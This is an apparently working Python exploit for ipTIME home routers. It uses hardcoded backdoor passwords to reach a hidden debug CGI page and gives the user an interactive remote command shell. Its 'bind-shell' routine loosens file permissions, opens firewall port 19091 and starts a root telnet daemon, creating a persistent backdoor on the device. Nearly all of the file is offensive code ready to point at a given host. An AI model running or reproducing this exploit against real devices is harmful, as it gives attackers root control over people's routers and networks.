import requests
import sys

pass_old = '#notenoughmineral^'
pass_new = '!@dnjsrurelqjrm*&'

## file changed!
userid = ''
userpw = ''

_Passname = 'aaksjdkfj'
_Passkey = ''

_dest = '/cgi-bin/d.cgi'
_setdest = '/cgi-bin/timepro.cgi'

_startParam = {_Passname : _Passkey }
_commandParam = {'act':'1','fname':'','cmd':''}

# REMOTE_SUPPORT MANAGEMENT SWITCH!
_enable = 'tmenu=sysconf&smenu=misc&act=remote_support&commit=&hostname=&autosaving=1&fakedns=0&nologin=0&wbm_popup=0&upnp=1&led_flag=0&ispfake=0&newpath=&remote_support=1&apcplan=1'
_disable = 'tmenu=sysconf&smenu=misc&act=remote_support&commit=&hostname=&autosaving=1&fakedns=0&nologin=0&wbm_popup=0&upnp=1&led_flag=0&ispfake=0&newpath=&remote_support=0&apcplan=1'

### chmod disabled!
_telnet_check = 'ls -al /sbin'
_permission_enable = '/bin/chmod 777 /sbin/iptables'
_permission_enable2 = '/bin/chmod 777 /sbin/utelnetd'
_telnet_enable_1 = '/sbin/iptables -A INPUT -p tcp --dport 19091 -j ACCEPT'
#_telnet_enable_1 = '/sbin/iptables -A INPUT -p tcp -m -tcp --dport 2323 -j ACCEPT'
_get_iptables = '/sbin/iptables --list'
_telnet_enable_2 = '/sbin/utelnetd -p 19091'
_demon_mode = 'cat /default/var/boa_vh.conf'

sess = requests.session()

def get(args):
    return sess.get(url='http://%s%s' % (sys.argv[1], _dest), params=args).text

def startup():
    x = _startParam.copy()
    if get(x).find('Command Name : ') == -1:
        print ("[x] Not vulnerable machine! cannot access debugging page.")
        exit(0)
    print ("[o] Debugging page exist!")

def deleteChunk(ref):
    findx = ref.find('<font size=-1>')
    ref = ref[findx:]
    ref = ref.replace('<font size=-1>','')
    ref = ref.replace('\n</font><br>','')
    return ref

def bind_shell():
    x =_commandParam.copy()
    x['cmd'] = _telnet_check
    ref = get(x)
    findx = ref.find('<font size=-1>')
    ref = ref[findx:]
    ref = ref.replace('<font size=-1>','')
    ref = ref.replace('\n</font><br>','')
    if ref.find('utelnetd') == -1:
        print ('[x] OOPS! Could not found telnet demon.')
        print ('[x] no exploitable -.-')
        exit(0)
    x['cmd'] = _demon_mode
    ref = deleteChunk(get(x))
    if ref.find('root') == -1:
        print ('[x] OOPS! httpd demon is not running at root.')
        print ('[x] no exploitable -.-')
    else:
        print ('[!] Exploitable! we start working...')
        x =_commandParam.copy()
        sys.stdout.write('[!] Setting up iptables... ')
        x['cmd'] = _telnet_enable_1
        ref = get(x)
        x['cmd'] = _get_iptables
        ref = deleteChunk(get(x))
        if ref.find('19091') == -1 :
            sys.stdout.write('Failed!')
            return
        sys.stdout.write('OK!')
        print ('')
        print ('[!] Working telnet demon server...')
        x['cmd'] = _telnet_enable_2
        get(x)
        print ('[o] Binding shell command executed. check it yourself. (port:19091)')

def showcmd(cmd):
    x = _commandParam.copy()
    x['cmd'] = cmd
    ref = get(x)
    t = deleteChunk(ref)
    if t == '>' : return()
    print (t)

if __name__ == '__main__':

    print ('[iptime-debug.py] - Directiry Debugging IPTIME python module - command eXecuter!')
    print ('Support : IPTIME 7.?? - 9.72')
    print ('Copyright : jochiwon.tistory.com\n')
    print ('firmware_version : (~ 9.12 = 0) / (9.14 ~ 9.72 = 1)')
    print ('Type "exit" to exit, "bind-shell" to bind telnet connection to port 2323. (deprecated)')

    if len(sys.argv) < 3:
        print ('\n>>> python3 hostname firmware_version [userid] [userpw]\n')
        print('firmware_version : (~ 9.12 = 0) / (9.14 ~ 9.72 = 1)')
        exit(0)

    sys.argv[1] = sys.argv[1].replace('http://','')
    sys.argv[1] = sys.argv[1].replace('/','')

    if int(sys.argv[2]) is 0:
        _Passkey = pass_old
    else:
        _Passkey = pass_new

    try:
        userid = sys.argv[3]
        userpw = sys.argv[4]
        sess.auth = (userid, userpw)
    except:
        pass

    _commandParam['aaksjdkfj'] = _Passkey

    while True:
        sys.__stdout__.write (sys.argv[1] + '> ')
        x = input()
        if x == 'exit': exit(0)
        elif x == 'bind-shell': bind_shell()
        elif x != '' : showcmd(x)
